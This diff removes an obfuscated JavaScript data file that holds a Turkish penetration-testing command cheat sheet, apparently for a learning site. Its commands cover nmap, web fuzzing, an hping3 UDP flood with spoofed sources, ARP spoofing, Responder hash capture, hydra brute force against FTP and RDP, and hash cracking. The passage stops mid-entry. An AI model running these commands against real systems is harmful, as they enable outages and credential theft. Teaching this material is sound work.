@@ -1,1 +1,1334 @@
-function _0x125a(_0x11bb18, _0x437494) { _0x11bb18 = _0x11bb18 - 0x93; var _0x158362 = _0x1583(); var _0x125a71 = _0x158362[_0x11bb18]; return _0x125a71; } var _0x36ad6b = _0x125a; (function (_0x57d5f1, _0x1aa378) { var _0xd2693e = _0x125a, _0x216e55 = _0x57d5f1(); while (!![]) { try { var _0x5e78eb = -parseInt(_0xd2693e(0x220)) / 0x1 + -parseInt(_0xd2693e(0x216)) / 0x2 * (-parseInt(_0xd2693e(0x1cf)) / 0x3) + -parseInt(_0xd2693e(0xe6)) / 0x4 * (-parseInt(_0xd2693e(0xb0)) / 0x5) + -parseInt(_0xd2693e(0x10d)) / 0x6 * (parseInt(_0xd2693e(0x152)) / 0x7) + parseInt(_0xd2693e(0x191)) / 0x8 * (parseInt(_0xd2693e(0x201)) / 0x9) + parseInt(_0xd2693e(0x23a)) / 0xa + -parseInt(_0xd2693e(0x11d)) / 0xb; if (_0x5e78eb === _0x1aa378) break; else _0x216e55['push'](_0x216e55['shift']()); } catch (_0x1f649d) { _0x216e55['push'](_0x216e55['shift']()); } } }(_0x1583, 0x7a3f3), window[_0x36ad6b(0x1c4)] = [{ 'id': 0x1, 'category': _0x36ad6b(0x17e), 'categoryName': _0x36ad6b(0x13b), 'badge': _0x36ad6b(0x196), 'title': _0x36ad6b(0x230), 'desc': _0x36ad6b(0x253), 'cmd': _0x36ad6b(0x211) }, { 'id': 0x2, 'category': _0x36ad6b(0x17e), 'categoryName': _0x36ad6b(0x13b), 'badge': _0x36ad6b(0x93), 'title': 'Kullanıcı\x20Kimlik\x20Numarası\x20ve\x20Grupları\x20İnceleme\x20(id)', 'desc': 'Kullanıcının\x20UID\x20(User\x20ID),\x20GID\x20(Group\x20ID)\x20ve\x20dahil\x20olduğu\x20güvenlik\x20gruplarını\x20(sudo,\x20adm,\x20kvm)\x20listeler.\x20Sudo\x20hakkınız\x20olup\x20olmadığını\x20anlamak\x20için\x20ilk\x20bakılan\x20komuttur.', 'cmd': 'id' }, { 'id': 0x3, 'category': 'linux', 'categoryName': _0x36ad6b(0x13b), 'badge': _0x36ad6b(0x246), 'title': _0x36ad6b(0xbe), 'desc': _0x36ad6b(0x18b), 'cmd': 'pwd' }, { 'id': 0x4, 'category': _0x36ad6b(0x17e), 'categoryName': _0x36ad6b(0x13b), 'badge': _0x36ad6b(0xd9), 'title': _0x36ad6b(0x242), 'desc': 'Nokta\x20ile\x20başlayan\x20gizli\x20sistem\x20dosyaları\x20dahil\x20tüm\x20dosyaları\x20dosya\x20izinleri\x20(rwx),\x20sahibi\x20ve\x20boyutu\x20ile\x20ayrıntılı\x20tablo\x20halinde\x20döker.', 'cmd': 'ls\x20-la' }, { 'id': 0x5, 'category': _0x36ad6b(0x17e), 'categoryName': _0x36ad6b(0x13b), 'badge': _0x36ad6b(0x1e3), 'title': 'Sistem\x20Log\x20Klasörüne\x20Geçiş\x20Yapma\x20(cd\x20/var/log)', 'desc': _0x36ad6b(0x94), 'cmd': 'cd\x20/var/log' }, { 'id': 0x6, 'category': _0x36ad6b(0x17e), 'categoryName': _0x36ad6b(0x13b), 'badge': _0x36ad6b(0x17c), 'title': _0x36ad6b(0x260), 'desc': _0x36ad6b(0x21b), 'cmd': _0x36ad6b(0x102) }, { 'id': 0x7, 'category': _0x36ad6b(0x17e), 'categoryName': _0x36ad6b(0x13b), 'badge': 'HATA\x20AYIKLAMA', 'title': _0x36ad6b(0xf1), 'desc': _0x36ad6b(0xf6), 'cmd': _0x36ad6b(0x1d3) }, { 'id': 0x8, 'category': _0x36ad6b(0x17e), 'categoryName': '1.\x20Linux\x20Temelleri', 'badge': _0x36ad6b(0xe0), 'title': _0x36ad6b(0xce), 'desc': _0x36ad6b(0x1c6), 'cmd': 'mkdir\x20-p\x20/opt/tools/recon' }, { 'id': 0x9, 'category': _0x36ad6b(0x17e), 'categoryName': _0x36ad6b(0x13b), 'badge': _0x36ad6b(0x101), 'title': _0x36ad6b(0x24a), 'desc': 'Kritik\x20güvenlik\x20anahtarlarını\x20diğer\x20kullanıcıların\x20okumasını\x20engeller.\x20SSH\x20bunu\x20zorunlu\x20tutar;\x20aksi\x20halde\x20anahtar\x20reddedilir.', 'cmd': _0x36ad6b(0x110) }, { 'id': 0xa, 'category': _0x36ad6b(0x17e), 'categoryName': _0x36ad6b(0x13b), 'badge': _0x36ad6b(0x264), 'title': _0x36ad6b(0x122), 'desc': _0x36ad6b(0x1df), 'cmd': 'sudo\x20chown\x20root:root\x20/etc/shadow' }, { 'id': 0xb, 'category': _0x36ad6b(0x17e), 'categoryName': '1.\x20Linux\x20Temelleri', 'badge': _0x36ad6b(0x9a), 'title': 'İşletim\x20Sistemi\x20Çekirdeği\x20ve\x20Mimarisi\x20Bilgisi\x20(uname\x20-a)', 'desc': _0x36ad6b(0x222), 'cmd': _0x36ad6b(0x206) }, { 'id': 0xc, 'category': _0x36ad6b(0x17e), 'categoryName': _0x36ad6b(0x13b), 'badge': _0x36ad6b(0x210), 'title': _0x36ad6b(0x19b), 'desc': _0x36ad6b(0x185), 'cmd': _0x36ad6b(0xd2) }, { 'id': 0xd, 'category': 'linux', 'categoryName': _0x36ad6b(0x13b), 'badge': 'BELLEK\x20KULLANIMI', 'title': _0x36ad6b(0x175), 'desc': _0x36ad6b(0x1d8), 'cmd': _0x36ad6b(0x1cc) }, { 'id': 0xe, 'category': _0x36ad6b(0x17e), 'categoryName': '1.\x20Linux\x20Temelleri', 'badge': _0x36ad6b(0x22e), 'title': 'Çalışan\x20Güvenlik\x20Servisini\x20ve\x20İşlemleri\x20Bulma\x20(ps\x20aux)', 'desc': _0x36ad6b(0x1dc), 'cmd': 'ps\x20aux\x20|\x20grep\x20dotnet' }, { 'id': 0xf, 'category': _0x36ad6b(0x17e), 'categoryName': _0x36ad6b(0x13b), 'badge': _0x36ad6b(0xa4), 'title': 'Ağ\x20Kartlarının\x20IP\x20ve\x20MAC\x20Adreslerini\x20Öğrenme\x20(ip\x20a)', 'desc': _0x36ad6b(0x137), 'cmd': _0x36ad6b(0x1cd) }, { 'id': _0x36ad6b(0xef), 'category': _0x36ad6b(0x17e), 'categoryName': _0x36ad6b(0x13b), 'badge': _0x36ad6b(0xba), 'title': _0x36ad6b(0x125), 'desc': 'Hedef\x20web\x20sitesinin\x20barındığı\x20sunucuları,\x20DNS\x20kayıtlarını\x20ve\x20alan\x20adı\x20sahibini\x20açık\x20kaynaklardan\x20sorgular.', 'cmd': _0x36ad6b(0xc9) }, { 'id': 0x10, 'category': _0x36ad6b(0x1b0), 'categoryName': _0x36ad6b(0x1af), 'badge': _0x36ad6b(0x10a), 'title': _0x36ad6b(0xd6), 'desc': 'Hedefte\x20hiçbir\x20gölge\x20servisin\x20(Shadow\x20IT)\x20unutulmaması\x20için\x201\x27den\x2065.535\x27e\x20kadar\x20tüm\x20TCP\x20portlarını\x20denetler.', 'cmd': _0x36ad6b(0x155) }, { 'id': 0x11, 'category': _0x36ad6b(0x1b0), 'categoryName': '2.\x20Ağ\x20&\x20Nmap', 'badge': _0x36ad6b(0x111), 'title': _0x36ad6b(0x143), 'desc': _0x36ad6b(0x1f8), 'cmd': _0x36ad6b(0x121) }, { 'id': 0x12, 'category': _0x36ad6b(0x1b0), 'categoryName': _0x36ad6b(0x1af), 'badge': _0x36ad6b(0x1de), 'title': _0x36ad6b(0x1dd), 'desc': _0x36ad6b(0x233), 'cmd': 'nmap\x20-F\x20192.168.1.1' }, { 'id': 0x13, 'category': _0x36ad6b(0x1b0), 'categoryName': _0x36ad6b(0x1af), 'badge': _0x36ad6b(0x1fa), 'title': _0x36ad6b(0x186), 'desc': _0x36ad6b(0xb9), 'cmd': _0x36ad6b(0x1b8) }, { 'id': 0x14, 'category': 'nmap', 'categoryName': _0x36ad6b(0x1af), 'badge': _0x36ad6b(0xa2), 'title': _0x36ad6b(0x241), 'desc': _0x36ad6b(0x20e), 'cmd': _0x36ad6b(0x1b6) }, { 'id': 0x15, 'category': 'nmap', 'categoryName': _0x36ad6b(0x1af), 'badge': _0x36ad6b(0x199), 'title': _0x36ad6b(0x169), 'desc': _0x36ad6b(0x1a0), 'cmd': 'sudo\x20nmap\x20-sn\x20192.168.1.0/24' }, { 'id': 0x16, 'category': _0x36ad6b(0x1b0), 'categoryName': _0x36ad6b(0x1af), 'badge': _0x36ad6b(0x255), 'title': 'Hedef\x20Cihazın\x20İşletim\x20Sistemini\x20Tahmin\x20Etme\x20(nmap\x20-O)', 'desc': _0x36ad6b(0x1b1), 'cmd': _0x36ad6b(0x1f7) }, { 'id': 0x17, 'category': _0x36ad6b(0x1b0), 'categoryName': _0x36ad6b(0x1af), 'badge': 'ÇOKLU\x20PORT', 'title': _0x36ad6b(0x1d2), 'desc': _0x36ad6b(0x1ff), 'cmd': _0x36ad6b(0x18a) }, { 'id': 0x18, 'category': _0x36ad6b(0x1b0), 'categoryName': _0x36ad6b(0x1af), 'badge': _0x36ad6b(0xd8), 'title': _0x36ad6b(0xb6), 'desc': _0x36ad6b(0x136), 'cmd': 'nmap\x20-sS\x20-T2\x20192.168.1.1' }, { 'id': 0x19, 'category': _0x36ad6b(0x1b0), 'categoryName': _0x36ad6b(0x1af), 'badge': _0x36ad6b(0x13f), 'title': _0x36ad6b(0x14a), 'desc': _0x36ad6b(0xeb), 'cmd': _0x36ad6b(0x25b) }, { 'id': 0x1a, 'category': _0x36ad6b(0x1b0), 'categoryName': _0x36ad6b(0x1af), 'badge': 'UDP\x20SERVİSLERİ', 'title': _0x36ad6b(0x19d), 'desc': _0x36ad6b(0x1ed), 'cmd': _0x36ad6b(0x232) }, { 'id': 0x1b, 'category': 'nmap', 'categoryName': _0x36ad6b(0x1af), 'badge': _0x36ad6b(0x9d), 'title': 'Agresif\x20Hepsi\x20Bir\x20Arada\x20Tarama\x20(nmap\x20-A)', 'desc': 'İşletim\x20sistemi\x20tespiti,\x20sürüm\x20tespiti,\x20traceroute\x20ve\x20varsayılan\x20script\x20taramalarının\x20tamamını\x20tek\x20komutta\x20birleştirir.', 'cmd': _0x36ad6b(0x145) }, { 'id': 0x1c, 'category': _0x36ad6b(0x1b0), 'categoryName': _0x36ad6b(0x1af), 'badge': 'EN\x20ÖNEMLİ\x2020\x20PORT', 'title': _0x36ad6b(0x21d), 'desc': 'İnternette\x20en\x20çok\x20açık\x20bırakılan\x2020\x20kritik\x20servis\x20portunu\x20hızlıca\x20denetler.', 'cmd': _0x36ad6b(0x21c) }, { 'id': 0x1d, 'category': _0x36ad6b(0x1b0), 'categoryName': _0x36ad6b(0x1af), 'badge': _0x36ad6b(0x13d), 'title': _0x36ad6b(0x1c2), 'desc': _0x36ad6b(0x167), 'cmd': 'nmap\x20-p\x20443\x20--script\x20ssl-cert\x20127.0.0.1' }, { 'id': 0x1e, 'category': _0x36ad6b(0x1b0), 'categoryName': _0x36ad6b(0x1af), 'badge': _0x36ad6b(0x1ea), 'title': 'HTTP\x20Güvenlik\x20Başlıklarını\x20Nmap\x20ile\x20Okuma\x20(http-headers)', 'desc': _0x36ad6b(0x23d), 'cmd': _0x36ad6b(0x140) }, { 'id': 0x1f, 'category': _0x36ad6b(0x1b0), 'categoryName': '2.\x20Ağ\x20&\x20Nmap', 'badge': _0x36ad6b(0xcf), 'title': _0x36ad6b(0x1bb), 'desc': _0x36ad6b(0x1c7), 'cmd': _0x36ad6b(0x1e8) }, { 'id': 0x20, 'category': _0x36ad6b(0x1b0), 'categoryName': _0x36ad6b(0x1af), 'badge': _0x36ad6b(0x25c), 'title': _0x36ad6b(0xa0), 'desc': _0x36ad6b(0x99), 'cmd': _0x36ad6b(0x262) }, { 'id': 0x21, 'category': 'nmap', 'categoryName': '2.\x20Ağ\x20&\x20Nmap', 'badge': _0x36ad6b(0x19a), 'title': 'Gerçek\x20IP\x27yi\x20Sahte\x20İstemciler\x20Arasında\x20Gizleme\x20(nmap\x20-D)', 'desc': _0x36ad6b(0xa9), 'cmd': _0x36ad6b(0x1a5) }, { 'id': 0x22, 'category': _0x36ad6b(0x1b0), 'categoryName': _0x36ad6b(0x1af), 'badge': _0x36ad6b(0x12e), 'title': _0x36ad6b(0x18f), 'desc': 'Paketinizin\x20hedefe\x20ulaşana\x20kadar\x20geçtiği\x20tüm\x20ara\x20santralleri\x20ve\x20ağ\x20düğümlerini\x20milisaniye\x20cinsinden\x20çizer.', 'cmd': _0x36ad6b(0x141) }, { 'id': 0x23, 'category': _0x36ad6b(0x1b0), 'categoryName': '2.\x20Ağ\x20&\x20Nmap', 'badge': 'RAPOR\x20KAYDI', 'title': _0x36ad6b(0x105), 'desc': _0x36ad6b(0x237), 'cmd': _0x36ad6b(0x14f) }, { 'id': 0x24, 'category': _0x36ad6b(0x144), 'categoryName': _0x36ad6b(0xdc), 'badge': _0x36ad6b(0x16d), 'title': _0x36ad6b(0x1c3), 'desc': _0x36ad6b(0x15b), 'cmd': _0x36ad6b(0xfd) }, { 'id': 0x25, 'category': _0x36ad6b(0x144), 'categoryName': _0x36ad6b(0xdc), 'badge': _0x36ad6b(0x205), 'title': 'Yedek\x20ve\x20Veritabanı\x20Dosyalarını\x20Bulma\x20(Gobuster\x20-x)', 'desc': _0x36ad6b(0x1a3), 'cmd': _0x36ad6b(0x22a) }, { 'id': 0x26, 'category': _0x36ad6b(0x144), 'categoryName': '3.\x20Web\x20&\x20Fuzzing', 'badge': 'ULTRA\x20HIZLI\x20FUZZER', 'title': _0x36ad6b(0x1d7), 'desc': _0x36ad6b(0x189), 'cmd': _0x36ad6b(0xf9) }, { 'id': 0x27, 'category': 'web', 'categoryName': '3.\x20Web\x20&\x20Fuzzing', 'badge': _0x36ad6b(0x1d5), 'title': _0x36ad6b(0x219), 'desc': '404\x20Not\x20Found\x20hatalarını\x20gizleyip\x20sadece\x20gerçekten\x20var\x20olan\x20geçerli\x20sayfaları\x20listeler.', 'cmd': 'ffuf\x20-u\x20http://127.0.0.1/FUZZ\x20-w\x20common.txt\x20-mc\x20200,301' }, { 'id': 0x28, 'category': _0x36ad6b(0x144), 'categoryName': '3.\x20Web\x20&\x20Fuzzing', 'badge': _0x36ad6b(0x1b7), 'title': _0x36ad6b(0x1ec), 'desc': _0x36ad6b(0xc4), 'cmd': _0x36ad6b(0xe5) }, { 'id': 0x29, 'category': 'web', 'categoryName': '3.\x20Web\x20&\x20Fuzzing', 'badge': _0x36ad6b(0x236), 'title': 'Standart\x20Web\x20İçerik\x20Keşfi\x20(Dirb)', 'desc': 'Klasik\x20ve\x20güvenilir\x20web\x20tarayıcı\x20aracıyla\x20sunucudaki\x20kök\x20klasörleri\x20sırayla\x20dener.', 'cmd': _0x36ad6b(0x184) }, { 'id': 0x2a, 'category': 'web', 'categoryName': _0x36ad6b(0xdc), 'badge': _0x36ad6b(0x178), 'title': '404\x20Kodlarını\x20Gizleyen\x20Renkli\x20Fuzzer\x20(Wfuzz)', 'desc': _0x36ad6b(0xd1), 'cmd': _0x36ad6b(0x179) }, { 'id': 0x2b, 'category': _0x36ad6b(0x144), 'categoryName': '3.\x20Web\x20&\x20Fuzzing', 'badge': 'WEB\x20ZAFİYET\x20TARAMASI', 'title': 'Web\x20Sunucusu\x20Yapılandırma\x20ve\x20Açık\x20Taraması\x20(Nikto)', 'desc': _0x36ad6b(0x150), 'cmd': 'nikto\x20-h\x20192.168.1.1' }, { 'id': 0x2c, 'category': _0x36ad6b(0x144), 'categoryName': _0x36ad6b(0xdc), 'badge': _0x36ad6b(0xe4), 'title': _0x36ad6b(0x1d9), 'desc': _0x36ad6b(0x157), 'cmd': _0x36ad6b(0xf3) }, { 'id': 0x2d, 'category': _0x36ad6b(0x144), 'categoryName': _0x36ad6b(0xdc), 'badge': _0x36ad6b(0x11e), 'title': _0x36ad6b(0xb5), 'desc': _0x36ad6b(0xae), 'cmd': _0x36ad6b(0x21e) }, { 'id': 0x2e, 'category': 'web', 'categoryName': _0x36ad6b(0xdc), 'badge': _0x36ad6b(0x1f3), 'title': _0x36ad6b(0x209), 'desc': _0x36ad6b(0x17d), 'cmd': _0x36ad6b(0x11b) }, { 'id': 0x2f, 'category': _0x36ad6b(0x144), 'categoryName': _0x36ad6b(0xdc), 'badge': _0x36ad6b(0x1ae), 'title': _0x36ad6b(0xb4), 'desc': _0x36ad6b(0x16b), 'cmd': _0x36ad6b(0x1aa) }, { 'id': 0x30, 'category': _0x36ad6b(0x144), 'categoryName': _0x36ad6b(0xdc), 'badge': 'REKÜRSİF\x20KEŞİF', 'title': _0x36ad6b(0x1f1), 'desc': _0x36ad6b(0xde), 'cmd': _0x36ad6b(0x95) }, { 'id': 0x31, 'category': _0x36ad6b(0x144), 'categoryName': '3.\x20Web\x20&\x20Fuzzing', 'badge': 'WORDPRESS\x20DENETİMİ', 'title': 'WordPress\x20Eklenti\x20ve\x20Kullanıcı\x20Taraması\x20(WPScan)', 'desc': _0x36ad6b(0xa3), 'cmd': _0x36ad6b(0xa1) }, { 'id': 0x32, 'category': _0x36ad6b(0x144), 'categoryName': '3.\x20Web\x20&\x20Fuzzing', 'badge': 'ARŞİV\x20BAĞLANTILARI', 'title': _0x36ad6b(0x19e), 'desc': _0x36ad6b(0x1be), 'cmd': _0x36ad6b(0x128) }, { 'id': 0x33, 'category': 'packet', 'categoryName': _0x36ad6b(0x172), 'badge': _0x36ad6b(0x183), 'title': _0x36ad6b(0x257), 'desc': _0x36ad6b(0x197), 'cmd': 'sudo\x20hping3\x20-S\x20-p\x2080\x20-c\x201\x20192.168.1.1' }, { 'id': 0x34, 'category': 'packet', 'categoryName': _0x36ad6b(0x172), 'badge': 'FIREWALL\x20TESTİ', 'title': _0x36ad6b(0x154), 'desc': 'Doğrudan\x20ACK\x20paketi\x20göndererek\x20güvenlik\x20duvarının\x20durum\x20takipli\x20(stateful)\x20olup\x20olmadığını\x20analiz\x20eder.', 'cmd': 'sudo\x20hping3\x20-A\x20-p\x2080\x20-c\x201\x20192.168.1.1' }, { 'id': 0x35, 'category': _0x36ad6b(0x1b9), 'categoryName': '4.\x20Paket\x20&\x20Firewall', 'badge': _0x36ad6b(0x217), 'title': _0x36ad6b(0x1e1), 'desc': _0x36ad6b(0x24b), 'cmd': _0x36ad6b(0xc7) }, { 'id': 0x36, 'category': _0x36ad6b(0x1b9), 'categoryName': _0x36ad6b(0x172), 'badge': _0x36ad6b(0x156), 'title': 'Belirli\x20Porta\x20Manuel\x20SYN\x20Paketi\x20Yollama\x20(hping3\x20-p\x2022)', 'desc': _0x36ad6b(0x259), 'cmd': _0x36ad6b(0xf5) }, { 'id': 0x37, 'category': 'packet', 'categoryName': _0x36ad6b(0x172), 'badge': _0x36ad6b(0x1ac), 'title': 'Rastgele\x20IP\x27lerle\x20UDP\x20Flood\x20Saldırı\x20Testi\x20(hping3\x20--flood)', 'desc': _0x36ad6b(0x12b), 'cmd': _0x36ad6b(0x15c) }, { 'id': 0x38, 'category': _0x36ad6b(0x1b9), 'categoryName': '4.\x20Paket\x20&\x20Firewall', 'badge': _0x36ad6b(0x25f), 'title': _0x36ad6b(0xd4), 'desc': _0x36ad6b(0x149), 'cmd': _0x36ad6b(0x126) }, { 'id': 0x39, 'category': _0x36ad6b(0x1b9), 'categoryName': _0x36ad6b(0x172), 'badge': 'XMAS\x20AĞ\x20TARAMASI', 'title': _0x36ad6b(0x22c), 'desc': _0x36ad6b(0x221), 'cmd': _0x36ad6b(0x14d) }, { 'id': 0x3a, 'category': 'packet', 'categoryName': _0x36ad6b(0x172), 'badge': _0x36ad6b(0x109), 'title': _0x36ad6b(0x1e7), 'desc': 'Hedefin\x2053\x20numaralı\x20UDP\x20portuna\x20paket\x20yollayarak\x20ICMP\x20Port\x20Unreachable\x20dönüp\x20dönmediğini\x20sınar.', 'cmd': _0x36ad6b(0x158) }, { 'id': 0x3b, 'category': 'packet', 'categoryName': _0x36ad6b(0x172), 'badge': _0x36ad6b(0x165), 'title': _0x36ad6b(0x256), 'desc': _0x36ad6b(0x13c), 'cmd': _0x36ad6b(0x1a2) }, { 'id': 0x3c, 'category': _0x36ad6b(0x1b9), 'categoryName': _0x36ad6b(0x172), 'badge': _0x36ad6b(0x162), 'title': _0x36ad6b(0x187), 'desc': 'Cihazın\x20kaç\x20gündür\x20yeniden\x20başlatılmadığını\x20(uptime)\x20tahmin\x20etmek\x20için\x20TCP\x20zaman\x20damgası\x20bayrağını\x20kullanır.', 'cmd': _0x36ad6b(0x24f) }, { 'id': 0x3d, 'category': _0x36ad6b(0x1b9), 'categoryName': _0x36ad6b(0x172), 'badge': _0x36ad6b(0x133), 'title': _0x36ad6b(0x202), 'desc': _0x36ad6b(0x1e0), 'cmd': 'sudo\x20nping\x20--tcp\x20-p\x2080,443\x20--flags\x20syn\x20127.0.0.1' }, { 'id': 0x3e, 'category': 'packet', 'categoryName': _0x36ad6b(0x172), 'badge': 'YÜKSEK\x20HIZLI\x20PING', 'title': _0x36ad6b(0xaf), 'desc': 'Tek\x20tek\x20beklemek\x20yerine\x20aynı\x20anda\x20tüm\x20alt\x20ağdaki\x20254\x20cihaza\x20ping\x20atarak\x20açık\x20cihazları\x200.2\x20saniyede\x20yakalar.', 'cmd': _0x36ad6b(0x13e) }, { 'id': 0x3f, 'category': _0x36ad6b(0x1b9), 'categoryName': '4.\x20Paket\x20&\x20Firewall', 'badge': _0x36ad6b(0xe7), 'title': 'TCP\x20Port\x20Gecikmesini\x20Ölçme\x20(tcpping)', 'desc': 'Web\x20portunun\x20bağlantı\x20kabul\x20etme\x20gecikmesini\x20milisaniye\x20hassasiyetinde\x20ölçer.', 'cmd': 'tcpping\x20127.0.0.1\x2080' }, { 'id': 0x40, 'category': _0x36ad6b(0x1b9), 'categoryName': '4.\x20Paket\x20&\x20Firewall', 'badge': _0x36ad6b(0x1bd), 'title': _0x36ad6b(0x203), 'desc': _0x36ad6b(0x160), 'cmd': _0x36ad6b(0xd0) }, { 'id': 0x41, 'category': _0x36ad6b(0x1b9), 'categoryName': _0x36ad6b(0x172), 'badge': _0x36ad6b(0x115), 'title': _0x36ad6b(0x251), 'desc': 'İstediğiniz\x20TCP/IP\x20bayrağını\x20ve\x20yükünü\x20sıfırdan\x20yazarak\x20güvenlik\x20açıklarını\x20test\x20edebileceğiniz\x20Python\x20ortamıdır.', 'cmd': _0x36ad6b(0x116) }, { 'id': 0x42, 'category': _0x36ad6b(0xa7), 'categoryName': _0x36ad6b(0x249), 'badge': _0x36ad6b(0x1db), 'title': _0x36ad6b(0x159), 'desc': _0x36ad6b(0x240), 'cmd': _0x36ad6b(0x194) }, { 'id': 0x43, 'category': 'mitm', 'categoryName': _0x36ad6b(0x249), 'badge': 'HAM\x20PAKET\x20YAKALAYICI', 'title': _0x36ad6b(0x223), 'desc': _0x36ad6b(0x114), 'cmd': _0x36ad6b(0xbb) }, { 'id': 0x44, 'category': _0x36ad6b(0xa7), 'categoryName': _0x36ad6b(0x249), 'badge': _0x36ad6b(0x23b), 'title': _0x36ad6b(0xc1), 'desc': 'Yalnızca\x20yeni\x20kurulan\x20bağlantıların\x20(SYN\x20bayraklı)\x20paketlerini\x20filtreleyerek\x20port\x20taramalarını\x20gerçek\x20zamanlı\x20yakalar.', 'cmd': _0x36ad6b(0x20f) }, { 'id': 0x45, 'category': _0x36ad6b(0xa7), 'categoryName': _0x36ad6b(0x249), 'badge': _0x36ad6b(0x208), 'title': _0x36ad6b(0x18e), 'desc': _0x36ad6b(0x100), 'cmd': _0x36ad6b(0x234) }, { 'id': 0x46, 'category': _0x36ad6b(0xa7), 'categoryName': _0x36ad6b(0x249), 'badge': _0x36ad6b(0xf4), 'title': _0x36ad6b(0xca), 'desc': 'Ağdaki\x20şifresiz\x20HTTP\x20isteklerinin\x20Host\x20ve\x20URI\x20adreslerini\x20ayıklayarak\x20canlı\x20listeler.', 'cmd': _0x36ad6b(0x153) }, { 'id': 0x47, 'category': 'mitm', 'categoryName': _0x36ad6b(0x249), 'badge': _0x36ad6b(0xe1), 'title': _0x36ad6b(0xc3), 'desc': 'Modem\x20ile\x20hedef\x20cihaz\x20arasına\x20girerek\x20trafiği\x20kendi\x20üzerinden\x20yönlendirmeye\x20çalışır.\x20Dynamic\x20ARP\x20Inspection\x20ile\x20korunulur.', 'cmd': _0x36ad6b(0x11f) }, { 'id': 0x48, 'category': _0x36ad6b(0xa7), 'categoryName': _0x36ad6b(0x249), 'badge': _0x36ad6b(0x21a), 'title': _0x36ad6b(0xa8), 'desc': 'Yerel\x20ağdaki\x20bağlantıları\x20haritalandırarak\x20şifrelenmemiş\x20protokolleri\x20denetler.', 'cmd': _0x36ad6b(0x248) }, { 'id': 0x49, 'category': _0x36ad6b(0xa7), 'categoryName': _0x36ad6b(0x249), 'badge': _0x36ad6b(0x198), 'title': 'Windows\x20İsim\x20Çözümleme\x20ve\x20NTLM\x20Özeti\x20Yakalama\x20(Responder)', 'desc': _0x36ad6b(0x1e9), 'cmd': 'sudo\x20responder\x20-I\x20eth0\x20-dwv' }, { 'id': 0x4a, 'category': _0x36ad6b(0xa7), 'categoryName': _0x36ad6b(0x249), 'badge': _0x36ad6b(0x188), 'title': 'Ağ\x20Kartının\x20MAC\x20Adresini\x20Rastgele\x20Değiştirme\x20(macchanger)', 'desc': _0x36ad6b(0x164), 'cmd': _0x36ad6b(0x11c) }, { 'id': 0x4b, 'category': 'mitm', 'categoryName': _0x36ad6b(0x249), 'badge': _0x36ad6b(0x1a7), 'title': _0x36ad6b(0x123), 'desc': _0x36ad6b(0x130), 'cmd': _0x36ad6b(0x16c) }, { 'id': 0x4c, 'category': _0x36ad6b(0xa7), 'categoryName': '5.\x20MITM\x20&\x20Dinleme', 'badge': _0x36ad6b(0x131), 'title': _0x36ad6b(0x1e4), 'desc': _0x36ad6b(0x23f), 'cmd': 'sudo\x20driftnet\x20-i\x20eth0' }, { 'id': 0x4d, 'category': _0x36ad6b(0xa7), 'categoryName': _0x36ad6b(0x249), 'badge': _0x36ad6b(0x24c), 'title': _0x36ad6b(0xb3), 'desc': 'İncelemeyi\x20daha\x20sonra\x20Wireshark\x20ile\x20yapabilmek\x20için\x20tüm\x20ağ\x20akışını\x20capture.pcap\x20dosyasına\x20depolar.', 'cmd': _0x36ad6b(0x23e) }, { 'id': 0x4e, 'category': _0x36ad6b(0x1b4), 'categoryName': '6.\x20Kimlik\x20&\x20Parola', 'badge': _0x36ad6b(0x1b5), 'title': 'Modem\x20/\x20Web\x20Paneli\x20Giriş\x20Doğrulama\x20Testi\x20(Hydra)', 'desc': _0x36ad6b(0x1ca), 'cmd': _0x36ad6b(0x1f2) }, { 'id': 0x4f, 'category': _0x36ad6b(0x1b4), 'categoryName': _0x36ad6b(0x1f9), 'badge': _0x36ad6b(0x252), 'title': _0x36ad6b(0x20b), 'desc': _0x36ad6b(0x9f), 'cmd': _0x36ad6b(0x244) }, { 'id': 0x50, 'category': _0x36ad6b(0x1b4), 'categoryName': _0x36ad6b(0x1f9), 'badge': 'FTP\x20DENETİMİ', 'title': _0x36ad6b(0x10f), 'desc': _0x36ad6b(0x97), 'cmd': 'hydra\x20-l\x20root\x20-P\x20rockyou.txt\x20ftp://192.168.1.10\x20-vV' }, { 'id': 0x51, 'category': _0x36ad6b(0x1b4), 'categoryName': '6.\x20Kimlik\x20&\x20Parola', 'badge': 'RDP\x20DENETİMİ', 'title': _0x36ad6b(0x227), 'desc': 'Windows\x20RDP\x20(3389)\x20portuna\x20bağlanarak\x20hesap\x20kilitleme\x20politikasının\x20çalışıp\x20çalışmadığını\x20ölçer.', 'cmd': _0x36ad6b(0x25a) }, { 'id': 0x52, 'category': _0x36ad6b(0x1b4), 'categoryName': _0x36ad6b(0x1f9), 'badge': _0x36ad6b(0x1fb), 'title': 'Rockyou\x20Sözlüğü\x20ile\x20Parola\x20Özeti\x20Çözme\x20(John\x20the\x20Ripper)', 'desc': 'Çalınan\x20veya\x20ele\x20geçirilen\x20şifre\x20özetlerini\x20(hash)\x2014\x20milyonluk\x20devasa\x20kelime\x20listesiyle\x20karşılaştırarak\x20çözer.', 'cmd': _0x36ad6b(0x142) }, { 'id': 0x53, 'category': _0x36ad6b(0x1b4), 'categoryName': _0x36ad6b(0x1f9), 'badge': _0x36ad6b(0xb8), 'title': _0x36ad6b(0x193), 'desc': _0x36ad6b(0x1bf), 'cmd': _0x36ad6b(0x238) }, { 'id': 0x54, 'category': 'auth', 'categoryName': _0x36ad6b(0x1f9), 'badge': 'GPU\x20HASHCAT', 'title': _0x36ad6b(0x192), 'desc': _0x36ad6b(0xda), 'cmd': 'hashcat\x20-m\x200\x20-a\x200\x20hash.txt\x20rockyou.txt' }, { 'id': 0x55, 'category': _0x36ad6b(0x1b4), 'categoryName': _0x36ad6b(0x1f9), 'badge': _0x36ad6b(0x103), 'title': _0x36ad6b(0xfe), 'desc': _0x36ad6b(0x9c), 'cmd': _0x36ad6b(0x218) }, { 'id': 0x56, 'category': _0x36ad6b(0x1b4), 'categoryName': _0x36ad6b(0x1f9), 'badge': _0x36ad6b(0x1c9), 'title': 'Hedef\x20Web\x20Sitesinden\x20Özel\x20Kelime\x20Listesi\x20Üretme\x20(CeWL)', 'desc': _0x36ad6b(0x112), 'cmd': 'cewl\x20https://example.com\x20-d\x202\x20-m\x205\x20-w\x20custom_list.txt' }, { 'id': 0x57, 'category': _0x36ad6b(0x1b4), 'categoryName': '6.\x20Kimlik\x20&\x20Parola', 'badge': _0x36ad6b(0x10e), 'title': _0x36ad6b(0x19c), 'desc': _0x36ad6b(0x173), 'cmd': _0x36ad6b(0xf0) }, { 'id': 0x58, 'category': 'auth', 'categoryName': _0x36ad6b(0x1f9), 'badge': _0x36ad6b(0xbf), 'title': _0x36ad6b(0x1cb), 'desc': 